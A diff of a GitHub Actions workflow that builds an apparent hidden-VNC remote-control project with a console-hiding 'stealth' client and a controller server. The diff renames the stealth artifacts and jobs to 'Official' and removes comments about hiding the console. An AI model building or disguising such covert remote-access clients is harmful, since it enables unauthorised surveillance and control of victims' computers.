@@ -1,4 +1,4 @@
-name: Build HVNC Project (Stealth Client, Official Standard)
+name: Build HVNC Project (100% Official Standard)
 on:
   push:
     branches: [ "main" ]
@@ -25,8 +25,8 @@ jobs:
           New-Item -Path "${{ github.workspace }}\build_output\Client" -ItemType Directory -Force
           New-Item -Path "${{ github.workspace }}\build_output\Server" -ItemType Directory -Force
 
-      # 被控端（Client）：彻底隐藏控制台、无PDB、无优化、静态链接
-      - name: Build Client (Stealth, No PDB, No Optimization)
+      # 被控端（Client）：彻底隐藏控制台（官方参数组合）
+      - name: Build Client (Stealth, Official Standard)
         run: |
           msbuild Client/HVNC.vcxproj `
             /p:Configuration=Release `
@@ -37,14 +37,14 @@ jobs:
             /p:Optimize=false `
             /p:LinkTimeCodeGeneration=false `
             /p:GenerateDebugInformation=false `
-            /p:SubSystem=Windows `  # 官方参数：强制Windows子系统
-            /p:EntryPoint=WinMainCRTStartup `  # 官方参数：强制GUI入口点，彻底隐藏控制台
+            /p:SubSystem=Windows `
+            /p:EntryPoint=WinMainCRTStartup `
             /p:AdditionalLinkerOptions="/Od /OPT:NOREF /OPT:NOICF /WHOLEARCHIVE" `
             /nologo `
             /verbosity:minimal
 
-      # 主控端（Server）：保留控制台、无PDB、无优化、静态链接
-      - name: Build Server (No PDB, No Optimization)
+      # 主控端（Server）：保留控制台（官方默认行为）
+      - name: Build Server (Official Standard)
         run: |
           msbuild Server/Server.vcxproj `
             /p:Configuration=Debug `
@@ -67,13 +67,13 @@ jobs:
       - name: Upload Client artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Client-Stealth-Final
+          name: HVNC-Client-Official
           path: ${{ github.workspace }}\build_output\Client\
           retention-days: 7
 
       - name: Upload Server artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: HVNC-Server-Debug-Final
+          name: HVNC-Server-Official
           path: ${{ github.workspace }}\build_output\Server\
           retention-days: 7
